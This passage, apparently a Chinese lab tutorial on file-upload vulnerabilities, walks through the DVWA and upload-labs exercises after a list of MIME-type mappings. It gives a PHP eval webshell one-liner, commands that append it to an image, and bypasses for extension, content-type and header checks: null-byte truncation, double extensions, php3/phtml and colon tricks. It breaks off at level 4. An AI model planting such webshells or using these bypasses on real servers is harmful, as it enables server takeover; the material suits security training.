&quot;application/x-httpd-php-source&quot;), (&quot;php3&quot;, &quot;application/x-httpd-php3&quot;), (&quot;php3p&quot;, &quot;application/x-httpd-php3-preprocessed&quot;), (&quot;php4&quot;, &quot;application/x-httpd-php4&quot;), (&quot;php5&quot;, &quot;application/x-httpd-php5&quot;), (&quot;ica&quot;, &quot;application/x-ica&quot;), (&quot;info&quot;, &quot;application/x-info&quot;), (&quot;ins&quot;, &quot;application/x-internet-signup&quot;), (&quot;isp&quot;, &quot;application/x-internet-signup&quot;), (&quot;iii&quot;, &quot;application/x-iphone&quot;), (&quot;iso&quot;, &quot;application/x-iso9660-image&quot;), (&quot;jam&quot;, &quot;application/x-jam&quot;), (&quot;jnlp&quot;, &quot;application/x-java-jnlp-file&quot;), (&quot;jmz&quot;, &quot;application/x-jmol&quot;), (&quot;chrt&quot;, &quot;application/x-kchart&quot;), (&quot;kil&quot;, &quot;application/x-killustrator&quot;), (&quot;skp&quot;, &quot;application/x-koan&quot;), (&quot;skd&quot;, &quot;application/x-koan&quot;), (&quot;skt&quot;, &quot;application/x-koan&quot;), (&quot;skm&quot;, &quot;application/x-koan&quot;), (&quot;kpr&quot;, &quot;application/x-kpresenter&quot;), (&quot;kpt&quot;, &quot;application/x-kpresenter&quot;), (&quot;ksp&quot;, &quot;application/x-kspread&quot;), (&quot;kwd&quot;, &quot;application/x-kword&quot;), (&quot;kwt&quot;, &quot;application/x-kword&quot;), (&quot;latex&quot;, &quot;application/x-latex&quot;), (&quot;lha&quot;, &quot;application/x-lha&quot;), (&quot;lyx&quot;, &quot;application/x-lyx&quot;), (&quot;lzh&quot;, &quot;application/x-lzh&quot;), (&quot;lzx&quot;, &quot;application/x-lzx&quot;), (&quot;frm&quot;, &quot;application/x-maker&quot;), (&quot;maker&quot;, &quot;application/x-maker&quot;), (&quot;frame&quot;, &quot;application/x-maker&quot;), (&quot;fm&quot;, &quot;application/x-maker&quot;), (&quot;fb&quot;, &quot;application/x-maker&quot;), (&quot;book&quot;, &quot;application/x-maker&quot;), (&quot;fbdoc&quot;, &quot;application/x-maker&quot;), (&quot;mif&quot;, &quot;application/x-mif&quot;), (&quot;wmd&quot;, &quot;application/x-ms-wmd&quot;), (&quot;wmz&quot;, &quot;application/x-ms-wmz&quot;), (&quot;com&quot;, &quot;application/x-msdos-program&quot;), (&quot;exe&quot;, &quot;application/x-msdos-program&quot;), (&quot;bat&quot;, &quot;application/x-msdos-program&quot;), (&quot;dll&quot;, &quot;application/x-msdos-program&quot;), (&quot;msi&quot;, &quot;application/x-msi&quot;), (&quot;nc&quot;, &quot;application/x-netcdf&quot;), (&quot;pac&quot;, &quot;application/x-ns-proxy-autoconfig&quot;), (&quot;dat&quot;, &quot;application/x-ns-proxy-autoconfig&quot;), (&quot;nwc&quot;, &quot;application/x-nwc&quot;), (&quot;o&quot;, &quot;application/x-object&quot;), (&quot;oza&quot;, &quot;application/x-oz-application&quot;), (&quot;p7r&quot;, &quot;application/x-pkcs7-certreqresp&quot;), (&quot;crl&quot;, &quot;application/x-pkcs7-crl&quot;), (&quot;pyc&quot;, &quot;application/x-python-code&quot;), (&quot;pyo&quot;, &quot;application/x-python-code&quot;), (&quot;qgs&quot;, &quot;application/x-qgis&quot;), (&quot;shp&quot;, &quot;application/x-qgis&quot;), (&quot;shx&quot;, &quot;application/x-qgis&quot;), (&quot;qtl&quot;, &quot;application/x-quicktimeplayer&quot;), (&quot;rpm&quot;, &quot;application/x-redhat-package-manager&quot;), (&quot;rb&quot;, &quot;application/x-ruby&quot;), (&quot;sh&quot;, &quot;application/x-sh&quot;), (&quot;shar&quot;, &quot;application/x-shar&quot;), (&quot;swf&quot;, &quot;application/x-shockwave-flash&quot;), (&quot;swfl&quot;, &quot;application/x-shockwave-flash&quot;), (&quot;scr&quot;, &quot;application/x-silverlight&quot;), (&quot;sit&quot;, &quot;application/x-stuffit&quot;), (&quot;sitx&quot;, &quot;application/x-stuffit&quot;), (&quot;sv4cpio&quot;, &quot;application/x-sv4cpio&quot;), (&quot;sv4crc&quot;, &quot;application/x-sv4crc&quot;), (&quot;tar&quot;, &quot;application/x-tar&quot;), (&quot;tcl&quot;, &quot;application/x-tcl&quot;), (&quot;gf&quot;, &quot;application/x-tex-gf&quot;), (&quot;pk&quot;, &quot;application/x-tex-pk&quot;), (&quot;texinfo&quot;, &quot;application/x-texinfo&quot;), (&quot;texi&quot;, &quot;application/x-texinfo&quot;), (&quot;~&quot;, &quot;application/x-trash&quot;), (&quot;%&quot;, &quot;application/x-trash&quot;), (&quot;bak&quot;, &quot;application/x-trash&quot;), (&quot;old&quot;, &quot;application/x-trash&quot;), (&quot;sik&quot;, &quot;application/x-trash&quot;), (&quot;t&quot;, &quot;application/x-troff&quot;), (&quot;tr&quot;, &quot;application/x-troff&quot;), (&quot;roff&quot;, &quot;application/x-troff&quot;), (&quot;man&quot;, &quot;application/x-troff-man&quot;), (&quot;me&quot;, &quot;application/x-troff-me&quot;), (&quot;ms&quot;, &quot;application/x-troff-ms&quot;), (&quot;ustar&quot;, &quot;application/x-ustar&quot;), (&quot;src&quot;, &quot;application/x-wais-source&quot;), (&quot;wz&quot;, &quot;application/x-wingz&quot;), (&quot;crt&quot;, &quot;application/x-x509-ca-cert&quot;), (&quot;xcf&quot;, &quot;application/x-xcf&quot;), (&quot;fig&quot;, &quot;application/x-xfig&quot;), (&quot;xpi&quot;, &quot;application/x-xpinstall&quot;), (&quot;amr&quot;, &quot;audio/amr&quot;), (&quot;awb&quot;, &quot;audio/amr-wb&quot;), (&quot;amr&quot;, &quot;audio/amr&quot;), (&quot;awb&quot;, &quot;audio/amr-wb&quot;), (&quot;axa&quot;, &quot;audio/annodex&quot;), (&quot;au&quot;, &quot;audio/basic&quot;), (&quot;snd&quot;, &quot;audio/basic&quot;), (&quot;flac&quot;, &quot;audio/flac&quot;), (&quot;mid&quot;, &quot;audio/midi&quot;), (&quot;midi&quot;, &quot;audio/midi&quot;), (&quot;kar&quot;, &quot;audio/midi&quot;), (&quot;mpga&quot;, &quot;audio/mpeg&quot;), (&quot;mpega&quot;, &quot;audio/mpeg&quot;), (&quot;mp2&quot;, &quot;audio/mpeg&quot;), (&quot;mp3&quot;, &quot;audio/mpeg&quot;), (&quot;m4a&quot;, &quot;audio/mpeg&quot;), (&quot;m3u&quot;, &quot;audio/mpegurl&quot;), (&quot;oga&quot;, &quot;audio/ogg&quot;), (&quot;ogg&quot;, &quot;audio/ogg&quot;), (&quot;spx&quot;, &quot;audio/ogg&quot;), (&quot;sid&quot;, &quot;audio/prs.sid&quot;), (&quot;aif&quot;, &quot;audio/x-aiff&quot;), (&quot;aiff&quot;, &quot;audio/x-aiff&quot;), (&quot;aifc&quot;, &quot;audio/x-aiff&quot;), (&quot;gsm&quot;, &quot;audio/x-gsm&quot;), (&quot;m3u&quot;, &quot;audio/x-mpegurl&quot;), (&quot;wma&quot;, &quot;audio/x-ms-wma&quot;), (&quot;wax&quot;, &quot;audio/x-ms-wax&quot;), (&quot;ra&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;rm&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;ram&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;ra&quot;, &quot;audio/x-realaudio&quot;), (&quot;pls&quot;, &quot;audio/x-scpls&quot;), (&quot;sd2&quot;, &quot;audio/x-sd2&quot;), (&quot;wav&quot;, &quot;audio/x-wav&quot;), (&quot;alc&quot;, &quot;chemical/x-alchemy&quot;), (&quot;cac&quot;, &quot;chemical/x-cache&quot;), (&quot;cache&quot;, &quot;chemical/x-cache&quot;), (&quot;csf&quot;, &quot;chemical/x-cache-csf&quot;), (&quot;cbin&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;cascii&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;ctab&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;cdx&quot;, &quot;chemical/x-cdx&quot;), (&quot;cer&quot;, &quot;chemical/x-cerius&quot;), (&quot;c3d&quot;, &quot;chemical/x-chem3d&quot;), (&quot;chm&quot;, &quot;chemical/x-chemdraw&quot;), (&quot;cif&quot;, &quot;chemical/x-cif&quot;), (&quot;cmdf&quot;, &quot;chemical/x-cmdf&quot;), (&quot;cml&quot;, &quot;chemical/x-cml&quot;), (&quot;cpa&quot;, &quot;chemical/x-compass&quot;), (&quot;bsd&quot;, &quot;chemical/x-crossfire&quot;), (&quot;csml&quot;, &quot;chemical/x-csml&quot;), (&quot;csm&quot;, &quot;chemical/x-csml&quot;), (&quot;ctx&quot;, &quot;chemical/x-ctx&quot;), (&quot;cxf&quot;, &quot;chemical/x-cxf&quot;), (&quot;cef&quot;, &quot;chemical/x-cxf&quot;), (&quot;smi&quot;, &quot;#chemical/x-daylight-smiles&quot;), (&quot;emb&quot;, &quot;chemical/x-embl-dl-nucleotide&quot;), (&quot;embl&quot;, &quot;chemical/x-embl-dl-nucleotide&quot;), (&quot;spc&quot;, &quot;chemical/x-galactic-spc&quot;), (&quot;inp&quot;, &quot;chemical/x-gamess-input&quot;), (&quot;gam&quot;, &quot;chemical/x-gamess-input&quot;), (&quot;gamin&quot;, &quot;chemical/x-gamess-input&quot;), (&quot;fch&quot;, &quot;chemical/x-gaussian-checkpoint&quot;), (&quot;fchk&quot;, &quot;chemical/x-gaussian-checkpoint&quot;), (&quot;cub&quot;, &quot;chemical/x-gaussian-cube&quot;), (&quot;gau&quot;, &quot;chemical/x-gaussian-input&quot;), (&quot;gjc&quot;, &quot;chemical/x-gaussian-input&quot;), (&quot;gjf&quot;, &quot;chemical/x-gaussian-input&quot;), (&quot;gal&quot;, &quot;chemical/x-gaussian-log&quot;), (&quot;gcg&quot;, &quot;chemical/x-gcg8-sequence&quot;), (&quot;gen&quot;, &quot;chemical/x-genbank&quot;), (&quot;hin&quot;, &quot;chemical/x-hin&quot;), (&quot;istr&quot;, &quot;chemical/x-isostar&quot;), (&quot;ist&quot;, &quot;chemical/x-isostar&quot;), (&quot;jdx&quot;, &quot;chemical/x-jcamp-dx&quot;), (&quot;dx&quot;, &quot;chemical/x-jcamp-dx&quot;), (&quot;kin&quot;, &quot;chemical/x-kinemage&quot;), (&quot;mcm&quot;, &quot;chemical/x-macmolecule&quot;), (&quot;mmd&quot;, &quot;chemical/x-macromodel-input&quot;), (&quot;mmod&quot;, &quot;chemical/x-macromodel-input&quot;), (&quot;mol&quot;, &quot;chemical/x-mdl-molfile&quot;), (&quot;rd&quot;, &quot;chemical/x-mdl-rdfile&quot;), (&quot;rxn&quot;, &quot;chemical/x-mdl-rxnfile&quot;), (&quot;sd&quot;, &quot;chemical/x-mdl-sdfile&quot;), (&quot;sdf&quot;, &quot;chemical/x-mdl-sdfile&quot;), (&quot;tgf&quot;, &quot;chemical/x-mdl-tgf&quot;), (&quot;mif&quot;, &quot;#chemical/x-mif&quot;), (&quot;mcif&quot;, &quot;chemical/x-mmcif&quot;), (&quot;mol2&quot;, &quot;chemical/x-mol2&quot;), (&quot;b&quot;, &quot;chemical/x-molconn-Z&quot;), (&quot;gpt&quot;, &quot;chemical/x-mopac-graph&quot;), (&quot;mop&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;mopcrt&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;mpc&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;zmt&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;moo&quot;, &quot;chemical/x-mopac-out&quot;), (&quot;mvb&quot;, &quot;chemical/x-mopac-vib&quot;), (&quot;asn&quot;, &quot;chemical/x-ncbi-asn1&quot;), (&quot;prt&quot;, &quot;chemical/x-ncbi-asn1-ascii&quot;), (&quot;ent&quot;, &quot;chemical/x-ncbi-asn1-ascii&quot;), (&quot;val&quot;, &quot;chemical/x-ncbi-asn1-binary&quot;), (&quot;aso&quot;, &quot;chemical/x-ncbi-asn1-binary&quot;), (&quot;asn&quot;, &quot;chemical/x-ncbi-asn1-spec&quot;), (&quot;pdb&quot;, &quot;chemical/x-pdb&quot;), (&quot;ent&quot;, &quot;chemical/x-pdb&quot;), (&quot;ros&quot;, &quot;chemical/x-rosdal&quot;), (&quot;sw&quot;, &quot;chemical/x-swissprot&quot;), (&quot;vms&quot;, &quot;chemical/x-vamas-iso14976&quot;), (&quot;vmd&quot;, &quot;chemical/x-vmd&quot;), (&quot;xtel&quot;, &quot;chemical/x-xtel&quot;), (&quot;xyz&quot;, &quot;chemical/x-xyz&quot;), (&quot;gif&quot;, &quot;image/gif&quot;), (&quot;ief&quot;, &quot;image/ief&quot;), (&quot;jpeg&quot;, &quot;image/jpeg&quot;), (&quot;jpg&quot;, &quot;image/jpeg&quot;), (&quot;jpe&quot;, &quot;image/jpeg&quot;), (&quot;pcx&quot;, &quot;image/pcx&quot;), (&quot;png&quot;, &quot;image/png&quot;), (&quot;svg&quot;, &quot;image/svg+xml&quot;), (&quot;svgz&quot;, &quot;image/svg+xml&quot;), (&quot;tiff&quot;, &quot;image/tiff&quot;), (&quot;tif&quot;, &quot;image/tiff&quot;), (&quot;djvu&quot;, &quot;image/vnd.djvu&quot;), (&quot;djv&quot;, &quot;image/vnd.djvu&quot;), (&quot;wbmp&quot;, &quot;image/vnd.wap.wbmp&quot;), (&quot;cr2&quot;, &quot;image/x-canon-cr2&quot;), (&quot;crw&quot;, &quot;image/x-canon-crw&quot;), (&quot;ras&quot;, &quot;image/x-cmu-raster&quot;), (&quot;cdr&quot;, &quot;image/x-coreldraw&quot;), (&quot;pat&quot;, &quot;image/x-coreldrawpattern&quot;), (&quot;cdt&quot;, &quot;image/x-coreldrawtemplate&quot;), (&quot;cpt&quot;, &quot;image/x-corelphotopaint&quot;), (&quot;erf&quot;, &quot;image/x-epson-erf&quot;), (&quot;ico&quot;, &quot;image/x-icon&quot;), (&quot;art&quot;, &quot;image/x-jg&quot;), (&quot;jng&quot;, &quot;image/x-jng&quot;), (&quot;bmp&quot;, &quot;image/x-ms-bmp&quot;), (&quot;nef&quot;, &quot;image/x-nikon-nef&quot;), (&quot;orf&quot;, &quot;image/x-olympus-orf&quot;), (&quot;psd&quot;, &quot;image/x-photoshop&quot;), (&quot;pnm&quot;, &quot;image/x-portable-anymap&quot;), (&quot;pbm&quot;, &quot;image/x-portable-bitmap&quot;), (&quot;pgm&quot;, &quot;image/x-portable-graymap&quot;), (&quot;ppm&quot;, &quot;image/x-portable-pixmap&quot;), (&quot;rgb&quot;, &quot;image/x-rgb&quot;), (&quot;xbm&quot;, &quot;image/x-xbitmap&quot;), (&quot;xpm&quot;, &quot;image/x-xpixmap&quot;), (&quot;xwd&quot;, &quot;image/x-xwindowdump&quot;), (&quot;eml&quot;, &quot;message/rfc822&quot;), (&quot;igs&quot;, &quot;model/iges&quot;), (&quot;iges&quot;, &quot;model/iges&quot;), (&quot;msh&quot;, &quot;model/mesh&quot;), (&quot;mesh&quot;, &quot;model/mesh&quot;), (&quot;silo&quot;, &quot;model/mesh&quot;), (&quot;wrl&quot;, &quot;model/vrml&quot;), (&quot;vrml&quot;, &quot;model/vrml&quot;), (&quot;x3dv&quot;, &quot;model/x3d+vrml&quot;), (&quot;x3d&quot;, &quot;model/x3d+xml&quot;), (&quot;x3db&quot;, &quot;model/x3d+binary&quot;), (&quot;manifest&quot;, &quot;text/cache-manifest&quot;), (&quot;ics&quot;, &quot;text/calendar&quot;), (&quot;icz&quot;, &quot;text/calendar&quot;), (&quot;css&quot;, &quot;text/css&quot;), (&quot;csv&quot;, &quot;text/csv&quot;), (&quot;323&quot;, &quot;text/h323&quot;), (&quot;html&quot;, &quot;text/html&quot;), (&quot;htm&quot;, &quot;text/html&quot;), (&quot;shtml&quot;, &quot;text/html&quot;), (&quot;uls&quot;, &quot;text/iuls&quot;), (&quot;mml&quot;, &quot;text/mathml&quot;), (&quot;asc&quot;, &quot;text/plain&quot;), (&quot;txt&quot;, &quot;text/plain&quot;), (&quot;text&quot;, &quot;text/plain&quot;), (&quot;pot&quot;, &quot;text/plain&quot;), (&quot;brf&quot;, &quot;text/plain&quot;), (&quot;rtx&quot;, &quot;text/richtext&quot;), (&quot;sct&quot;, &quot;text/scriptlet&quot;), (&quot;wsc&quot;, &quot;text/scriptlet&quot;), (&quot;tm&quot;, &quot;text/texmacs&quot;), (&quot;ts&quot;, &quot;text/texmacs&quot;), (&quot;tsv&quot;, &quot;text/tab-separated-values&quot;), (&quot;jad&quot;, &quot;text/vnd.sun.j2me.app-descriptor&quot;), (&quot;wml&quot;, &quot;text/vnd.wap.wml&quot;), (&quot;wmls&quot;, &quot;text/vnd.wap.wmlscript&quot;), (&quot;bib&quot;, &quot;text/x-bibtex&quot;), (&quot;boo&quot;, &quot;text/x-boo&quot;), (&quot;h++&quot;, &quot;text/x-c++hdr&quot;), (&quot;hpp&quot;, &quot;text/x-c++hdr&quot;), (&quot;hxx&quot;, &quot;text/x-c++hdr&quot;), (&quot;hh&quot;, &quot;text/x-c++hdr&quot;), (&quot;c++&quot;, &quot;text/x-c++src&quot;), (&quot;cpp&quot;, &quot;text/x-c++src&quot;), (&quot;cxx&quot;, &quot;text/x-c++src&quot;), (&quot;cc&quot;, &quot;text/x-c++src&quot;), (&quot;h&quot;, &quot;text/x-chdr&quot;), (&quot;htc&quot;, &quot;text/x-component&quot;), (&quot;csh&quot;, &quot;text/x-csh&quot;), (&quot;c&quot;, &quot;text/x-csrc&quot;), (&quot;d&quot;, &quot;text/x-dsrc&quot;), (&quot;diff&quot;, &quot;text/x-diff&quot;), (&quot;patch&quot;, &quot;text/x-diff&quot;), (&quot;hs&quot;, &quot;text/x-haskell&quot;), (&quot;java&quot;, &quot;text/x-java&quot;), (&quot;lhs&quot;, &quot;text/x-literate-haskell&quot;), (&quot;moc&quot;, &quot;text/x-moc&quot;), (&quot;p&quot;, &quot;text/x-pascal&quot;), (&quot;pas&quot;, &quot;text/x-pascal&quot;), (&quot;gcd&quot;, &quot;text/x-pcs-gcd&quot;), (&quot;pl&quot;, &quot;text/x-perl&quot;), (&quot;pm&quot;, &quot;text/x-perl&quot;), (&quot;py&quot;, &quot;text/x-python&quot;), (&quot;scala&quot;, &quot;text/x-scala&quot;), (&quot;etx&quot;, &quot;text/x-setext&quot;), (&quot;sh&quot;, &quot;text/x-sh&quot;), (&quot;tcl&quot;, &quot;text/x-tcl&quot;), (&quot;tk&quot;, &quot;text/x-tcl&quot;), (&quot;tex&quot;, &quot;text/x-tex&quot;), (&quot;ltx&quot;, &quot;text/x-tex&quot;), (&quot;sty&quot;, &quot;text/x-tex&quot;), (&quot;cls&quot;, &quot;text/x-tex&quot;), (&quot;vcs&quot;, &quot;text/x-vcalendar&quot;), (&quot;vcf&quot;, &quot;text/x-vcard&quot;), (&quot;3gp&quot;, &quot;video/3gpp&quot;), (&quot;axv&quot;, &quot;video/annodex&quot;), (&quot;dl&quot;, &quot;video/dl&quot;), (&quot;dif&quot;, &quot;video/dv&quot;), (&quot;dv&quot;, &quot;video/dv&quot;), (&quot;fli&quot;, &quot;video/fli&quot;), (&quot;gl&quot;, &quot;video/gl&quot;), (&quot;mpeg&quot;, &quot;video/mpeg&quot;), (&quot;mpg&quot;, &quot;video/mpeg&quot;), (&quot;mpe&quot;, &quot;video/mpeg&quot;), (&quot;mp4&quot;, &quot;video/mp4&quot;), (&quot;qt&quot;, &quot;video/quicktime&quot;), (&quot;mov&quot;, &quot;video/quicktime&quot;), (&quot;ogv&quot;, &quot;video/ogg&quot;), (&quot;mxu&quot;, &quot;video/vnd.mpegurl&quot;), (&quot;flv&quot;, &quot;video/x-flv&quot;), (&quot;lsf&quot;, &quot;video/x-la-asf&quot;), (&quot;lsx&quot;, &quot;video/x-la-asf&quot;), (&quot;mng&quot;, &quot;video/x-mng&quot;), (&quot;asf&quot;, &quot;video/x-ms-asf&quot;), (&quot;asx&quot;, &quot;video/x-ms-asf&quot;), (&quot;wm&quot;, &quot;video/x-ms-wm&quot;), (&quot;wmv&quot;, &quot;video/x-ms-wmv&quot;), (&quot;wmx&quot;, &quot;video/x-ms-wmx&quot;), (&quot;wvx&quot;, &quot;video/x-ms-wvx&quot;), (&quot;avi&quot;, &quot;video/x-msvideo&quot;), (&quot;movie&quot;, &quot;video/x-sgi-movie&quot;), (&quot;mpv&quot;, &quot;video/x-matroska&quot;), (&quot;mkv&quot;, &quot;video/x-matroska&quot;), (&quot;ice&quot;, &quot;x-conference/x-cooltalk&quot;), (&quot;sisx&quot;, &quot;x-epoc/x-sisx-app&quot;), (&quot;vrm&quot;, &quot;x-world/x-vrml&quot;), (&quot;vrml&quot;, &quot;x-world/x-vrml&quot;), (&quot;wrl&quot;, &quot;x-world/x-vrml&quot;)] 文件头检查文件头检查只对文件头进行基本的校验： 常见的文件头： 后缀 文件头 文本类型 PNG 89504E47 ‰[不可显示字符]PNG GIF 47494638 GIF8 JPEG FFD8FF ÿØÿ 图马的制作 Windows 1copy pic.jpg/b+shell.php/a shell.jpg 参数/b指定以二进制格式复制、合并文件， 用于图像类/声音类文件 参数/a指定以 ASCII 格式复制、合并文件，用于 txt 等文本类文件 Linux 123456789101112131415➜ Desktop lspic.png shell.php# 拷贝一个 shell.png 用于后面的操作➜ Desktop cp pic.png shell.png➜ Desktop lspic.png shell.php shell.png# 查看一下 shell.php 内容➜ Desktop cat shell.php&lt;?php eval($_POST['x']) ?&gt;%# 将 shell.php 内容追加到 shell.png 中➜ Desktop cat shell.php &gt;&gt; shell.png 手动查看一下，发现图片尾部已经存在 WebShell 木马了： 手动生成的图马当然也是可以直接上传成功的： 00截断PHP 5.2 存在 00 截断漏洞，截断也可以用来突破上传后缀限制。发现存在路径参数，一般设计到路径参数的多，大多数可以通过 00 截断路径来突破上传限制： /var/www/html/upload/shell.php%00 /var/www/html/upload/shell.php%00 shell.png 最终成功拿到 webshell 双写后缀可以看到上传功能的逻辑代码为： 123$name = basename($_FILES['file']['name']);$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");$name = str_replace($blacklist, "", $name); 发现一个经典的 BUG 写法： 1$name = str_replace($blacklist, "", $name); 这种情况一般都可以进行双写绕过：上传的文件名为shell.pphphp，那么被替换之后就为shell.php DVWA 文件上传File Upload LOW12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125;&#125;?&gt; 没有任何过滤直接上传 File Upload Medium123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 只校验了 Content-Type： 123// Is it an image?if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp;( $uploaded_size &lt; 100000 ) ) &#123; File Upload High1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 白名单很严格，基本无法绕过 PHP strrpos() 函数查找字符串在另一字符串中最后一次出现的位置 1strrpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定在何处开始搜索。 123&lt;?phpecho strrpos("You love php, I love php too!","php");?&gt; PHP getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 利用思路主要是：绕过getimagesize()函数检测识别和上传文件名的检测识别。 让getimagesize()函数检测无效的方法：文件头欺骗，继而使得getimagesize()函数无法判断： 12345678910111213141516&lt;html&gt;&lt;header&gt; &lt;meta charset="UTF-8"&gt;&lt;/header&gt;&lt;h1&gt;图片&lt;/h1&gt;&lt;?php$image = getimagesize("imgs/php.png");print_r($image);?&gt;&lt;h1&gt;木马&lt;/h1&gt;&lt;?php$shell = getimagesize("imgs/shell.png");print_r($shell);?&gt;&lt;/html&gt; Upload Labs 文件上传项目地址：https://github.com/c0ny1/upload-labs 运行phpstudy前要先运行modify_path.bat hackbar 插件 x=system（&#39;dir&#39;）;验证传是否成功,x为一句话密码 第1关 前端js绕过12345678910111213141516171819&lt;script type="text/javascript"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == "") &#123; alert("请选择要上传的文件!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.png|.gif"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 前端禁用js 抓包绕过 第2关 content-type123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 第3关 php3 phtml1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; deny_ext 黑名单判断，于是尝试用php3,phtml绕过 apache httpd.conf进行配置 1AddType application/x-httpd-php .php .php3 .phtml 在文件上传时，我们往往会考虑到文件名截断，如%00 等.. 可能还会用冒号(“:”)去截断 13.php:jpg 冒号截断产生的文件是空白的，里面并不会有任何的内容 会写入一个3.php的空文件 &lt; 就等于 **,而*代码任意字符，于是乎可以这样修改上传的文件名，如下： 然后修改名字为 123.&lt;&lt;&lt;&lt;?php phpinfo();?&gt; 第4关 